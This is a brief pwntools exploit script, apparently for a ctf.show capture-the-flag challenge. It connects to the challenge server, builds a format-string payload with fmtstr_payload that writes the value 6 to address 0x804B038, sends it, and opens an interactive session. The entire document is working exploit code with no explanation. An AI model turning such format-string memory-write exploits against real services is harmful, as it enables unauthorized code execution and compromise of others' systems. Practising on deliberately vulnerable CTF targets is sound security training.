from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28262)
daniu = 0x804B038
payload = fmtstr_payload(7,{daniu:6})
io.sendline(payload)
io.interactive()
